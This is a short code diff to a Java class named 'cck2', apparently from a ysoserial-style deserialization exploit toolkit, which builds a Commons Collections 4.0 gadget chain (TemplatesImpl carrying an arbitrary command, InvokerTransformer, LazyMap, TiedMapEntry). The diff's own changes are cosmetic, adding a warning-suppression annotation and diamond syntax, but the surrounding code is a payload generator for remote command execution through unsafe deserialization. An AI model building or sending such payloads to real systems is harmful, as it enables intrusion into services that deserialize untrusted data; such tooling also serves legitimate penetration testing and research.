@@ -10,6 +10,7 @@ import org.apache.commons.collections4.map.LazyMap;
 import java.util.HashMap;
 import java.util.Map;
 
+@SuppressWarnings({"rawtypes", "unchecked","unused"})
 @Dependencies({"commons-collections:commons-collections:4.0"})
 public class cck2 implements ReleaseableObjectPayload<Object> {
 
@@ -18,7 +19,7 @@ public class cck2 implements ReleaseableObjectPayload<Object> {
 
         templates = Gadgets.createTemplatesImpl(command);
         InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
-        HashMap<String, String> innerMap = new HashMap<String, String>();
+        HashMap<String, String> innerMap = new HashMap<>();
         Map m = LazyMap.lazyMap(innerMap, transformer);
         Map outerMap = new HashMap();
         TiedMapEntry tied = new TiedMapEntry(m, templates);
